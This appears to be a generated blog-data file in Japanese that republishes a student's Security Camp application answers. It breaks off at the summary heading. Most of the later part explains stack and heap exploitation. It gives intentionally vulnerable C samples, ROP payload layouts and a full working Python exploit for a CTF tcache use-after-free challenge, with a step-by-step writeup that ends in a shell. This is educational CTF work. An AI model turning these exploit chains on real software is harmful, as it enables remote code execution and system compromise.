// 自動生成ファイル: drafts/*.md から npm run drafts で作られる。手で編集しない
export const generatedPosts = [
  {
    "slug": "security-camp-assignments",
    "title": "セキュリティキャンプ応募課題晒し(2026, Cクラス)",
    "date": "2026-10-30",
    "tags": [
      "securitycamp",
      "md",
      "脅威解析"
    ],
    "description": "セキュリティキャンプの応募課題を晒します．",
    "site": {
      "name": "サイト名",
      "role": "制作・執筆",
      "period": "2026 後期",
      "tech": [
        "Astro",
        "SCSS"
      ]
    },
    "intro": [
      "このページは、セキュリティ・キャンプ全国大会 2026 の C トラック（脅威クラス）に応募した際の応募課題を、実際に提出した内容を書いています。かなり幸運なご縁があり、無事全国大会を修了することができました。これからセキュリティキャンプに参加して見たいという方の参考になればと考えています。",
      "参考：[セキュリティ・キャンプ2026全国大会](https://www.ipa.go.jp/jinzai/security-camp/zenkoku.html)"
    ],
    "toc": [
      {
        "id": "section-1",
        "text": "問１"
      },
      {
        "id": "section-2",
        "text": "問2"
      },
      {
        "id": "section-3",
        "text": "問3"
      },
      {
        "id": "section-4",
        "text": "問4"
      },
      {
        "id": "section-5",
        "text": "問5"
      },
      {
        "id": "section-6",
        "text": "問6"
      },
      {
        "id": "section-7",
        "text": "問7"
      }
    ],
    "body": [
      {
        "type": "heading",
        "level": 2,
        "text": "問１",
        "id": "section-1"
      },
      {
        "type": "problem",
        "blocks": [
          "あなたがセキュリティ・キャンプ全国大会に応募する理由を教えてください。受講生や講師とのコミュニケーション、受講したい講義、なりたい自分など、何でも構いません。"
        ]
      },
      "セキュリティ・キャンプ全国大会に応募した理由は、ログから攻撃者の意図を読み解く力を身につけるためです。この力は、書籍の学習だけでは獲得できないと考えています。 私はこれまで、基本情報技術者・応用情報技術者と段階的に資格を取得し、その過程でセキュリティ分野への関心を深めてきました。さらに情報処理安全確保支援士（セキスぺ）の学習を進めるなかで、知識を実際のシステムで試したいという意欲が芽生え、県内で開催されたCTFにも参加するようになりました。習得した知識を実践しようと、サークル管轄の学内専用Webサーバー上に掲示板アプリケーションを自作し、学校内で公開しました。 しかし、リリースからわずか1週間も経たないうちに、JavaScriptインジェクション・データ保存フォーマットの破壊・制御文字を用いた表示崩し・容量超過を狙った攻撃と、複数の手法による攻撃を立て続けに受けました。セキスぺで体系的に学んだはずの知識が、現実の攻撃の前では全く不十分だったことを痛感しました。自作システムが攻撃されること自体が想定外でしたが、それ以上に衝撃だったのは、学内という限られた環境であっても、自分が意図した動作をこれほど容易に破壊させられるという事実でした。それと同時に、荒らされたコンテンツを目の当たりにした悔しさから「この攻撃者を上回るセキュリティを実装してやろう」という強いモチベーションが湧き上がりました。 サーバーのアクセスログを精査したところ、Basic認証のログに攻撃者の情報が記録されていました。その情報から知っている先輩と特定でき、直接話を聞きに行き、事前調査の方法・具体的な攻撃手法・防御されると困るポイントを教えていただきました。 特に衝撃的だったのは、制御文字を挿入してデータフォーマットを意図的に崩すという攻撃手法でした。資格のテキストを読んでも、このような着眼点には絶対に辿り着けなかったと確信しています。攻撃者が何を見て、どこを突こうとするのかという視点は、防御側の視点ではわかりにくいものだと考えました。また、ログを確認していた時点では「何が起きているか」はある程度把握できていたものの、「なぜ・どのような意図で攻撃しているのか」は全く読み取れませんでした。先輩から話を聞いて初めて、散らばったログが意味を持つ線として繋がりました。 この経験から、ログという事実情報を収集するだけでなく、そこから攻撃者の意図を読み解く「解釈する力」こそが防御の核心であると気づきました。先輩から攻撃の全容を聞いた後、XSS対策のサニタイズ処理の強化・制御文字のフィルタ機構・容量上限のバリデーション追加を実装しました。しかし実装を進めるうちに、別の問いが浮かびました。「既知の攻撃手法には対応できるが、自分が想定していないパターンで攻撃された場合、ログのどの異変をどの時点で検知すべきか」という問いです。 セキュリティ・キャンプに求めているのは、この問いを実際に手を動かした経験を持つ人たちと議論できる環境です。先輩との対話がそうであったように、双方向の議論からでしか気づけない視点があると確信しています。受講するだけでなく、自分の知識や経験を共有し、互いに成長しあえる参加者でありたいと考えています。 本大会で特に受講したい講義は「Connecting the Dots: 点を繋いでサイバー脅威インテリジェンスへ」です。断片的な情報を統合・分析して攻撃者の意図を読み解くというテーマは、先述の経験から私が最も痛感している「ログを解釈する力」の課題そのものです。セキュリティキャンプ参加者と交流しつつ、実践を通じてログを読み解く力を身に着けていきたいです。そして、最終的には攻撃者の視点を持ちながらセキュリティを設計することのできるエンジニアを目指します。",
      {
        "type": "heading",
        "level": 2,
        "text": "問2",
        "id": "section-2"
      },
      {
        "type": "problem",
        "blocks": [
          "今までに解析したことのあるソフトウェアやハードウェアにはどのようなものがありますか？解析の目的や解析方法、結果として得られた知見などを含めて教えてください。"
        ]
      },
      "私がこれまでに解析したソフトウェアとして、CTFのバイナリー問題として出題された実行ファイル解析を挙げます。",
      {
        "type": "heading",
        "level": 4,
        "text": "解析の目的"
      },
      "課題としてlinux環境で動作するELFファイルからFlagを取得することです。",
      {
        "type": "heading",
        "level": 4,
        "text": "実行ファイルの状況"
      },
      "グー、チョキ、パーの選択肢が与えられ、勝つとflagが出力されます。",
      {
        "type": "code",
        "code": "Rock, Paper, Scissors, one,two,three!\nyour hand is (Rock:0, Paper:1, Scissors:2) ->"
      },
      "しかし自分が入力した値に対して、コンピュータ側が必ず勝つ手を出す仕様になっていました。",
      "また、stringsコマンドで静的解析をした結果、下記のような出力がされています。",
      {
        "type": "code",
        "code": "your hand is (Rock:0, Paper:1, Scissors:2) ->\nRock\nPaper\nScissors\nflag is always with you.\nRock, Paper, Scissors, one,two,three!\nyour hand :\nopponent hand :\nWho is to blame?\ngood job! you win!\nflag is flag{\nyou lose.\nvRQ>\n8STs\nLwH'\n%02x",
        "lang": "bash"
      },
      "プログラム内ではプレーンテキストとしてflagが保存されておらず、じゃんけんに勝利した場合のみ、その値が変数に代入されて表示されるようでした。",
      {
        "type": "heading",
        "level": 4,
        "text": "解析方法"
      },
      "ghidraを使用して逆コンパイルを行い処理の流れを確認しました。その後、実行ファイルをバイナリエディタで開き、勝利条件の値を逆にすることでflagを出力させました。",
      {
        "type": "heading",
        "level": 4,
        "text": "結果"
      },
      "ここから勝利条件の値を逆にすることでflagを出力させました。条件判断する前に自分の出した手の数字＋1or0が計算されてからおり、そのあとに判定をしていたので必ず負ける仕様だったため、判定を逆にするパターンを埋め込む形で16進数の値を直接変えました。",
      "この経験から、実行ファイルのようなマシン語でかかれたデータも時間を書ければ理解できることを知りました。数字の羅列で構成されているバイナリ系のデータの意味を理解すること自体に忌避感を抱いていましたが、実際にバイナリを直接編集する事でその考え方が変わり始めました。一見意味のない羅列でも、ちゃんとルールに沿った記述がされていればある程度は理解可能だと知りました。",
      {
        "type": "heading",
        "level": 2,
        "text": "問3",
        "id": "section-3"
      },
      {
        "type": "problem",
        "blocks": [
          "今までに作成したソフトウェアやハードウェアにはどのようなものがありますか？どんな言語やライブラリ、パーツを使って作ったのか、どこにこだわって作ったのか、などたくさん自慢してください。"
        ]
      },
      "私が作成したソフトウェアとして、学内のコンピュータの端末利用状況をリアルタイムで確認できるWebシステムを紹介します。",
      {
        "type": "heading",
        "level": 4,
        "text": "開発の背景"
      },
      "私は、Ubuntu端末150台を抱える学科専用計算機室(通称KKI)の保守・管理を担うKKI-Assistに所属しています。業務の一つに、端末をログインしたまま長時間放置しているユーザーを発見し、セッションを削除するという作業があります。しかしこの作業は、誰がどの端末にログインしているかを把握するために実際に端末室を巡回し、1台1台確認する必要があり、効率が悪いと感じていました。そこで、各端末のログイン状況をWebブラウザからリアルタイムに一覧できるシステムがあれば、放置セッションを遠隔から素早く把握できると考え、「KKI利用状況確認システム」を自主学習の一環として開発しました。",
      {
        "type": "heading",
        "level": 4,
        "text": "システム概要"
      },
      "技術選定から処理フローの設計まですべて自分で検討し、以下の構成で実装しました。",
      {
        "type": "list",
        "items": [
          "**Pythonスクリプト**: 各端末にSSH接続してログイン状況を取得し、全端末の状態を1つのファイルにまとめて5秒周期で更新します。",
          "**PHP**: 端末状態ファイルを参照してJSON形式に整形するAPIとして機能を作成しました。",
          "**HTML/CSS/JavaScript**: PHPのAPIからJSONを受け取り、5秒ごとに画面を自動更新します。",
          "**サーバー**: 学内Webページ公開用のサーバーを使用しました。学外からのアクセスにはBasic認証を設けてアクセスが制限されています。"
        ]
      },
      "いずれの技術も、フレームワークに頼らず自分で書くことを選びました。Webシステムの動作を自分の手で確かめながら進めたかったためです。開発に時間がかかることは承知のうえで取り組みました。",
      {
        "type": "heading",
        "level": 4,
        "text": "技術的な課題と解決"
      },
      "最も手こずったのはSSH接続のオーバーヘッドです。当初は更新ごとに全端末へSSH接続してログイン状況を取得していました。しかし150台分の接続・切断を5秒ごとに繰り返すとシステム全体への負荷が高く、学内端末自体が重くなってしまうという問題がありました。topコマンドでプロセスのCPU使用率を確認したところ、「毎回接続を確立・切断していること」がボトルネックだと特定しました。そこで、一度SSHセッションを確立したらそのまま維持し続け、その中で定期的に状態を取得する方式に変更しました。この改修で更新処理のオーバーヘッドを大幅に削減し、安定した5秒更新を実現しました。",
      {
        "type": "heading",
        "level": 4,
        "text": "現状の課題"
      },
      "現在は「現在の状態」の可視化に留まっており、過去の利用データを活用した混雑予測には対応できていません。また、SSH接続が切断された場合のリカバリ処理が不完全で、一部の端末で状態取得が止まってしまうことがあります。SSH接続が切断される原因の一つは、端末自体がフリーズして接続を維持していた子プロセスが消滅するケースです。この場合、Webフロントへの反映が止まるため、逆に端末異常を検知する判断材料にもなっています。crontab機能で毎日更新しているので、最大24時間の停止に抑えられているのですが、取得が止まること自体を防ぐ処理が未対応なため、根本的な解決を目指したいです。",
      {
        "type": "heading",
        "level": 4,
        "text": "今後の展望"
      },
      "蓄積した利用ログをもとに、時間帯・曜日ごとの混雑傾向を可視化する機能を追加したいと考えています。また、接続断時の自動再接続ロジックを整備し、より安定した監視システムに仕上げることが直近の目標です。",
      {
        "type": "heading",
        "level": 2,
        "text": "問4",
        "id": "section-4"
      },
      {
        "type": "problem",
        "blocks": [
          "Ubuntu 22.04環境における、プロセスの仮想アドレス空間とメモリ破壊の脆弱性について、以下の問いに答えてください。生成AIの使用は制限しません。"
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "問4-1"
      },
      {
        "type": "problem",
        "blocks": [
          "スタック領域（stack）とヒープ領域（heap）について、C言語のプログラムにおける利用方法を説明してください。また、これらの領域に関連する代表的なセキュリティ機構について説明し、それらがメモリ破壊の脆弱性の悪用に対してどのような防御を提供するかについても述べてください。"
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "スタック領域（stack）とヒープ領域（heap）"
      },
      {
        "type": "list",
        "items": [
          "**スタック領域**: 局所変数や関数の引数を保存する領域です。他にも関数の戻りアドレスを保存し、関数終了時に呼び出し元へのアドレスをロードするのに利用されます。スタックは関数呼び出しのたびにフレームが積まれ、関数終了時に解放されます。",
          "**ヒープ領域**: 動的に確保されたデータを保存します。また、複数の関数を跨いで使うデータを置く領域です。スタック領域で確保されるデータとは異なり、プログラマが明示的に確保・解放する必要があります。C言語のソースコードであれば、`malloc()`,`calloc()`,`realloc()`を使って変数を確保し、`free()`で解放します。"
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "代表的なセキュリティ機構"
      },
      "C言語では言語レベルでメモリ保護はされていません。基本的に開発者のプログラムによってメモリ安全性を確保する必要があります。ただし、C言語自体に言語レベルのメモリ安全機構はありませんが、スタックやヒープの安全性を高める仕組みはOS・コンパイラ・ランタイムレイヤで多数提供されています。",
      {
        "type": "list",
        "items": [
          "**ASLR**: OSがスタック・ヒープ・ライブラリのアドレスをランダム化することで、アドレスを予測されにくくします。",
          "**Stack Canary**: スタックにランダム値をおくことで、関数終了時に値が変わっていればバッファオーバーフローを検出します。",
          "**NX/DEP**: データ領域でのコード実行を禁止する機構で、シェルコードの実行を制限させます。",
          "**PIE**: 実行ファイル自体のアドレスもランダム化することで、ASLRと合わせて不正実行を防ぎます。",
          "**RELRO**: 関数アドレスのテーブルを読み取り専用にすることでポインタ書き換えを防ぎます。",
          "**tcache**: 解放済みチャンクをスレッドごとにキャッシュして高速化する仕組みです。tcache自体は二重解放を自動検出する仕組みではなく、適切なチェックがないと二重解放が利用され得ます。",
          "**Safe-linking**: tcacheで保存されたfdポインタを保護する機構です。保存場所のアドレスを難読化します。難読化にはXOR演算が使われ、ポインタをその場所のアドレスとXORします。しかし、ヒープアドレスがわかってしまうと逆XORにより元のポインタを特定できてしまう弱点もあります。"
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "問4-2"
      },
      {
        "type": "problem",
        "blocks": [
          "スタックバッファーオーバーフロー脆弱性を利用して Remote Code Execution（RCE）を達成するまでの Exploit の流れを説明してください。また、ヒープバッファーオーバーフロー脆弱性を利用する場合についても、RCE に至るまでの Exploit の流れを説明してください。なお、説明にあたっては、前問で述べたセキュリティ機構のバイパス方法に着目してください。"
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "スタックバッファオーバーフロー"
      },
      "スタックバッファオーバーフロー攻撃では、関数終了時に改竄されたアドレスへジャンプさせ、攻撃者の用意したコードを実行することが目的の攻撃です。まず最初にスタック上に固定サイズでバッファが確保されていて、そこに境界チェックなしの関数でユーザー入力が書き込まれます。その際、入力が64バイトを超えるとスタック上の隣接領域を上書きし、バッファの後ろに位置する戻りアドレスを上書きします。その戻りアドレスに攻撃者の埋め込んだ関数のアドレスを設定することで、攻撃が成功します。例えば、以下のようなコードだとこの攻撃が成立する可能性があります。",
      {
        "type": "code",
        "code": "#include <stdio.h>\n#include <string.h>\n\nvoid win() {\n    system(\"/bin/sh\");\n}\n\nvoid vuln() {\n    char buf[64];\n    printf(\"Input: \");\n    gets(buf);    // 境界チェックなし：64バイト超の入力でスタックを破壊できる\n    printf(buf);  // format string bug：%p などでスタック上のcanaryやlibcアドレスを読める\n}\n\nint main() {\n    vuln();\n    return 0;\n}",
        "lang": "c"
      },
      "攻撃は以下の順序で行います。",
      {
        "type": "list",
        "items": [
          "[リーク] 1回目の入力に `%p.%p.%p...` を送り、`printf(buf)` のformat string bugを使ってスタック上のcanary値とlibcのアドレスを読み出す",
          "[BOF] 2回目の入力に以下のペイロードを送る"
        ],
        "ordered": true
      },
      {
        "type": "code",
        "code": "[64バイト padding] | [canary] | [rbp×8バイト] | [pop rdi; ret] | [/bin/sh addr] | [system addr]"
      },
      "canaryは1で取得した値、`system`と`/bin/sh`のアドレスはlibcリーク値からオフセット計算で求めます。`vuln()`がリターンする際にROP chainが実行され、シェルが起動します。",
      "上記の例ではRCEに至るまでにStack Canary, NX, ASLRの３つの防御機構をバイパスする必要があります。まずStack Canaryでは、別の脆弱性を利用して実行して動いているプロセスのCanary値を取得することで、ペイロード作成時にそのCanary値が変化しないデータを作成することで回避します。ここでスタック領域のデータを取得する方法としては、上記コードの`printf(buf)`のようなフォーマットストリングバグを利用してスタック上のcanary値やlibcアドレスを読み出す方法があります。NXではスタック上のシェルコードの実行が制限されているので、既存コードを繋げて実行することでバイパスします。まずreturn命令で終わる短い命令列を探し出し、それを戻りアドレスに連鎖させます。典型的な形としては、system関数などの既存libc関数を呼び出す形です。ASLRではStack Canaryのようなスタック領域のデータを読み出す別の脆弱性を利用することでランダム化しているアドレス値をバイパスします。また、ASLRでは実行のたびにベースアドレスをランダム化するのみであり、ライブラリ内の関数の相対位置は変化しないので、どこか一つのアドレスがリークできると他の関数のアドレス全てが計算で求めることができます。",
      {
        "type": "heading",
        "level": 4,
        "text": "ヒープバッファーオーバーフロー"
      },
      "次にヒープバッファオーバーフロー攻撃では、メモリアロケータを騙して任意のアドレスにチャンクを割り当てさせるのを目的にする攻撃です。まずはヒープのバッファをオーバーフローさせ、隣接する解放済みチャンクのfdポインタを改ざんします。次にプログラムがmalloc()を呼び出すことで攻撃者が指定した任意のアドレスにチャンクが割り当てられます。そしてそのアドレスに関数ポインタを書き込ませることで攻撃が成功します。例えば、以下のようなコードだとこの攻撃が成立する可能性があります。",
      {
        "type": "code",
        "code": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nvoid win() {\n    system(\"/bin/sh\");\n}\n\nvoid (*func_ptr)() = NULL;\n\nint main() {\n    char *a = malloc(64);\n    char *b = malloc(64);\n\n    free(b);\n\n    printf(a);  // format string bug：%p などでヒープアドレスやlibcアドレスを読める\n\n    printf(\"Input: \");\n    read(0, a, 128);  // 境界チェックなし：64バイト超でBのfd（XOR暗号化済み）を上書き\n\n    char *c = malloc(64); \n    char *d = malloc(64); \n\n    *(void **)d = win;\n\n    func_ptr();\n    return 0;\n}",
        "lang": "c"
      },
      "攻撃は以下の順序で行います。",
      {
        "type": "list",
        "items": [
          "[リーク] 1回目の入力に `%p.%p.%p...` を送り、`printf(a)` のformat string bugでヒープアドレスとlibcアドレスを読み出す",
          "[BOF] 2回目の入力でチャンクBの`fd`を上書きする。Safe-linkingで暗号化されているため、以下でfdを計算してから送る"
        ],
        "ordered": true
      },
      {
        "type": "code",
        "code": "fd_enc = target_addr ^ (heap_addr >> 12)"
      },
      "ここで`target_addr`は`func_ptr`のアドレス、`heap_addr`は1で取得した値",
      {
        "type": "list",
        "items": [
          "[書き込み] `malloc()`を2回呼んで`func_ptr`にチャンクを割り当て、`win()`のアドレスを書き込む。`func_ptr()`呼び出し時にシェルが起動する"
        ],
        "ordered": true
      },
      "上記の例ではRCEに至るまでにSafe-linking, NX, ASLRの３つの防御機構をバイパスする必要があります。Safe-linkingでは上記コードの`printf(a)`のようなformat string bugでヒープアドレスをリークし、`fd_enc = target_addr ^ (heap_addr >> 12)` のXOR逆算で正しいfdを偽装することでバイパスします。NX, ASLRはスタックバッファオーバーフローと同様にバイパスします。",
      {
        "type": "heading",
        "level": 3,
        "text": "問4-3"
      },
      {
        "type": "problem",
        "blocks": [
          {
            "type": "list",
            "items": [
              {
                "text": "c3.tar.gzを展開すると、以下の3つのPwn問題のディレクトリが含まれています。",
                "list": {
                  "ordered": false,
                  "items": [
                    "tcache_poisoning",
                    "tcache_patch_1",
                    "tcache_patch_2"
                  ]
                }
              },
              "tcache_poisoningには問題ファイル一式に加え、solver (exploit.py) と解説 (writeup.md＋スクリーンショット) が付属しています。以降の課題では、これを参考資料として活用してください。",
              {
                "text": "問題の内容が完全に理解できない場合でも、自分が理解できた範囲までを整理して記述することを推奨します。理解できている部分と、理解できていない部分について",
                "list": {
                  "ordered": false,
                  "items": [
                    "どこまで理解できたか",
                    "どこから理解できていないのか",
                    "その理由や自分なりの分析"
                  ]
                }
              }
            ]
          },
          "をstatus.mdにまとめ、提出物の tar.gz にそれぞれ含めてください。"
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "問4-3-1"
      },
      {
        "type": "problem",
        "blocks": [
          {
            "type": "list",
            "items": [
              "tcache_patch_1にはsolverであるexploit.pyが付属しています。以下の課題に取り組んでください。"
            ]
          },
          {
            "type": "list",
            "items": [
              "exploit.pyに適切なコメントを追加し、各処理が何を行っているかを最適な粒度で説明してください",
              "tcache_poisoningのwriteup.mdと同等の形式・粒度で、writeup.mdを作成してください。",
              "writeup.mdには、各ステップにおいて、`bata24/gef`や`pwndbg`などのデバッガを用いたスクリーンショットによる「親切な」解説を含めてください。",
              "上記で作成したファイル群 (exploit.py, writeup.md, image/*.png)をtar.gzで固めて提出してください。"
            ],
            "ordered": true
          },
          "Exploitationの要点を押さえたスクリーンショットが付加されているか、や、どのようなコマンドを使っているかなどの創意工夫を重視します。冗長であったり自明なスクリーンショットは必要ありません。"
        ]
      },
      "まず、各処理にコメントを付けた solver（exploit.py）を示します。",
      {
        "type": "code",
        "code": "#!/usr/bin/env python3\n\nfrom ptrlib import *\n\nelf = ELF('./dist/tcache')\nlibc = ELF('./build/libc.so.6')\n#io = Process('./dist/tcache')\nio = Socket('localhost' , 40001)\n\ndef make(index, size):\n    io.sendlineafter(\"> \", \"1\")\n    io.sendlineafter(\"index > \", str(index))\n    io.sendlineafter(\"size > \", str(size))\n    return\n\ndef edit(index, data):\n    io.sendlineafter(\"> \", \"2\")\n    io.sendlineafter(\"index > \", str(index))\n    io.sendlineafter(\"data > \", data)\n    return\n\ndef show(index):\n    io.sendlineafter(\"> \", \"3\")\n    io.sendlineafter(\"index > \", str(index))\n    return io.recvuntil(\"1\")[:-1]\n\ndef delete(index):\n    io.sendlineafter(\"> \", \"4\")\n    io.sendlineafter(\"index > \", str(index))\n    return\n\ndef exit_app():\n    io.sendlineafter(\"> \", \"5\")\n    return\n\nmake(0, 0x50) # tcacheサイズ分のチャンクを一つ確保\ndelete(0) # チャンクを解放することでtcache binsに入れる\nheap_addr = u64(show(0)) << 12 # Safe-linkingの逆算によりヒープアドレスを復元する\nprint(\"[+] heap addr is \" + hex(heap_addr))\n\nmake(0, 0x500) # libcアドレスをリークするためのチャンクを確保\nmake(1, 0x20) # メモリ解放時にヒープの末尾と結合されるのを防ぐためのチャンク\ndelete(0) # チャンクを解放することでunsorted binsに入れる\nlibc.base = u64(show(0)) - 0x21ace0 # fdが指す先はmain_arenaなので、オフセット0x21ace0を引くことでlibcアドレスを復元する\nprint(\"[+] libc addr is \" + hex(libc.base))\n\ndef aar(addr):\n    delete(3) # 前回のチャンク呼び出しをリセット\n    make(3, 0x30) # チャンクを確保\n    delete(3) # tcache[0x40]に登録する\n    edit(3, p64((heap_addr + 0x310) >> 12) + b\"A\"*4) # double-freeを回避するためにkeyをAAAAで上書き。ついで自身のアドレス(heap_addr+chunk3のアドレス)をXOR演算した値としてfdを上書きする値を用意\n    delete(3) # keyを上書きしたため二重freeが可能\n    edit(3, p64(addr ^ ((heap_addr + 0x310) >> 12))) # fdを書き換えて次のmakeでfdとしてaddrが返すようにする\n    make(3, 0x30) # bin[0x40]の先頭がaddrに切り替わる\n    make(4, 0x30) # addrにチャンクが確保される\n    return show(4) # addrの内容をリークする\n\ndef aaw(addr, data):\n    delete(3) # 前回のチャンク呼び出しをリセット\n    make(3, 0x30) # チャンクを確保\n    delete(3) # tcache[0x40]に登録する\n    edit(3, p64((heap_addr + 0x310) >> 12) + b\"A\"*4) # double-freeを回避するためにkeyをAAAAで上書き。ついで自身のアドレス(heap_addr+chunk3のアドレス)をXOR演算した値としてfdを上書きする値を用意\n    delete(3) # keyを上書きしたため二重freeが可能\n    edit(3, p64(addr ^ ((heap_addr + 0x310) >> 12))) # fdを書き換えて次のmakeでfdとしてaddrが返すようにする\n    input(\"PAUSE_aaw_fd\")\n    make(3, 0x30) # bin[0x40]の先頭がaddrに切り替わる\n    input(\"PAUSE_aaw_bins\")\n    make(4, 0x30) # addrにチャンクが確保される\n    edit(4, data) # addrにデータを書き込む\n    return\n\nstack_addr = u64(aar(libc.symbol('environ'))) # AARでlibcのenviron変数を読む\nprint(\"[+] stack addr is \" + hex(stack_addr)) # libcのデータ領域にenvironはあり、スタックアドレスも入っている\ninput(\"PAUSE_aaaaaaa\")\npayload = b\"A\" * 8 # 戻りアドレスまでパディングを用意\npayload += p64(next(libc.gadget('pop rdi; ret;'))) # ROPチェーンを\npayload += p64(next(libc.search(\"/bin/sh\")))\npayload += p64(next(libc.gadget(\"ret;\")))\npayload += p64(libc.symbol('system'))\naaw(stack_addr - 0x128, payload)\ninput(\"PAUSE_rop\")\nexit_app()\nio.interactive()",
        "lang": "python"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "ソースコードの分析"
      },
      "このプログラムは最大 5 個のノートを管理し、以下の操作を提供する。",
      {
        "type": "table",
        "header": [
          "機能",
          "説明"
        ],
        "rows": [
          [
            "make_note",
            "指定 index に malloc でチャンクを確保"
          ],
          [
            "edit_note",
            "指定 index のチャンクに fgets で書き込み"
          ],
          [
            "show_note",
            "指定 index のチャンクの内容を表示"
          ],
          [
            "delete_note",
            "指定 index のチャンクを free"
          ],
          [
            "exit",
            "プログラムを終了"
          ]
        ]
      },
      "`tcache_poisoning` と比べたときの大きな違いは、`delete_note()` が `note[index]` と `size[index]` を初期化しない点である。そのため、一度 free したチャンクに対しても `edit_note()` や `show_note()` がそのまま使えてしまい、Use-After-Free が成立する。",
      {
        "type": "heading",
        "level": 4,
        "text": "脆弱性：解放後ポインタの残留 (Use-After-Free)"
      },
      {
        "type": "code",
        "code": "void delete_note() {\n  ...\n  free(note[index]);\n  return;\n}",
        "lang": "c"
      },
      "`delete_note()` は free しただけで、`note[index] = NULL` や `size[index] = 0` を行わない。そのため、解放済みのチャンクに対して `show_note()` で中身を読んだり、`edit_note()` で書き込んだりできる。",
      "この挙動を使うと、tcache に入ったチャンクの管理情報を壊して、tcache poisoning の足がかりを作れる。",
      {
        "type": "heading",
        "level": 4,
        "text": "脆弱性：tcache の double free 回避を伴うメタデータ改ざん"
      },
      "glibc 2.32 以降では Safe Linking があり、tcache の `next` ポインタは `ptr ^ (chunk_addr >> 12)` でエンコードされる。さらに tcache のエントリには `key` もあり、同じチャンクを再度 free すると double free 検査に引っかかる。",
      "しかし、この問題では UAF により free 済みチャンクの内容を上書きできるため、`key` を壊して double free を通し、その後 `next` を任意アドレスに向け直せる。",
      {
        "type": "heading",
        "level": 4,
        "text": "Exploit 手順 Step 1: heap アドレスのリーク"
      },
      {
        "type": "code",
        "code": "make(0, 0x50)\ndelete(0)\nheap_addr = u64(show(0)) << 12",
        "lang": "python"
      },
      {
        "type": "list",
        "items": [
          "`0x50` サイズのチャンクを tcache に入れる",
          "free 後のチャンクには Safe Linking 済みのポインタが残る",
          "`show(0)` でその値を読んで `<< 12` すると heap ベースアドレスを復元できる"
        ],
        "ordered": true
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Exploit 手順 Step 2: libc アドレスのリーク"
      },
      {
        "type": "code",
        "code": "make(0, 0x500)\nmake(1, 0x20)\ndelete(0)\nlibc.base = u64(show(0)) - 0x21ace0",
        "lang": "python"
      },
      {
        "type": "list",
        "items": [
          "大きめのチャンクを確保して free し、unsorted bin を使って libc 内アドレスを漏らす",
          "`show(0)` で `main_arena` 近辺のアドレスが見える",
          "オフセット `0x21ace0` を引くことで libc ベースを求める"
        ],
        "ordered": true
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Exploit 手順 Step 3: UAF を使った tcache poisoning の準備"
      },
      {
        "type": "code",
        "code": "def aar(addr):\n    delete(3)\n    make(3, 0x30)\n    delete(3)\n    edit(3, p64((heap_addr + 0x310) >> 12) + b\"A\"*4)\n    delete(3)\n    edit(3, p64(addr ^ ((heap_addr + 0x310) >> 12)))\n    make(3, 0x30)\n    make(4, 0x30)\n    return show(4)",
        "lang": "python"
      },
      {
        "type": "list",
        "items": [
          "`index 3` にチャンクを作り、free して tcache に戻す",
          "その解放済みチャンクに UAF で書き込み、`key` を壊して double free を成立させる",
          "もう一度 free して同じ chunk を tcache に複数回入れる",
          "さらに `next` を任意アドレスに向け、次回の `malloc` でそのアドレスを返させる"
        ],
        "ordered": true
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Exploit 手順 Step 4: 任意アドレス読み出し (AAR)"
      },
      {
        "type": "code",
        "code": "stack_addr = u64(aar(libc.symbol('environ')))",
        "lang": "python"
      },
      "`tcache` を `libc.symbol('environ')` に向けることで、スタック上の環境変数ポインタを読める。`environ` はスタックアドレスを指しているため、ここから stack アドレスのリークが可能になる。",
      "environ 領域にチャンクが確保された後の note 配列・size 配列の状態。`note[4]` が environ 領域を指しており、`show(4)` でスタックアドレスをリークできる。",
      {
        "type": "image",
        "src": "/assets/img/blog/security-camp/4-3-1-04-environ-note-array.png",
        "alt": "environ領域にチャンク確保後のnote/size配列"
      },
      "また、下記に`aar(libc.symbol('environ'))` 実行後の tcache bins の状態を示す。tcache 0x40 の先頭に environ の値（スタックアドレス `0x7ffde4479800`）が繋がれており、environ 領域の読み出しに成功したことが確認できる。",
      {
        "type": "image",
        "src": "/assets/img/blog/security-camp/4-3-1-04-tcache-environ-bins.png",
        "alt": "tcache 0x40 にenviron のアドレスが残っている"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Exploit 手順 Step 5: 任意アドレス書き込み (AAW)"
      },
      {
        "type": "code",
        "code": "aaw(stack_addr - 0x128, payload)",
        "lang": "python"
      },
      "`environ` から得た stack アドレスをもとに、リターンアドレス付近へ ROP チェーンを書き込む。`payload` は以下の順で構成される。",
      {
        "type": "list",
        "items": [
          "`pop rdi; ret`",
          "`/bin/sh` の文字列アドレス",
          "スタックアライメント調整用の `ret`",
          "`system`"
        ],
        "ordered": true
      },
      "以下は `aaw(stack_addr - 0x128, payload)` 実行時、UAF で fd をスタックのリターンアドレス付近に書き換えた直後の tcache bins の状態。tcache 0x40 に 2 エントリが連なっており、先頭チャンクの次にスタックアドレスが繋がれている。",
      {
        "type": "image",
        "src": "/assets/img/blog/security-camp/4-3-1-05-stack-tcache-poisoning.png",
        "alt": "UAF + fd書き換え後のtcache binsの状態（スタックへのtcache poisoning）"
      },
      "`make(3, 0x30)` 後、先頭エントリが消費されスタックアドレスだけが残る。",
      {
        "type": "image",
        "src": "/assets/img/blog/security-camp/4-3-1-05-return-addr-tcache.png",
        "alt": "tcache binsの状態（リターンアドレス領域）"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Exploit 手順 Step 6: シェル取得"
      },
      {
        "type": "code",
        "code": "exit_app()",
        "lang": "python"
      },
      "`main` が return したタイミングで ROP チェーンが実行され、`system(\"/bin/sh\")` によりシェルが起動する。",
      "ROPペイロード書き込み後、`main` の `ret` 命令実行直前のスタックの状態。リターンアドレスが ROP チェーンで上書きされている。",
      {
        "type": "image",
        "src": "/assets/img/blog/security-camp/4-3-1-05-ignite-rop-payload.png",
        "alt": "ROPペイロード書き込み後のスタック"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "まとめ"
      },
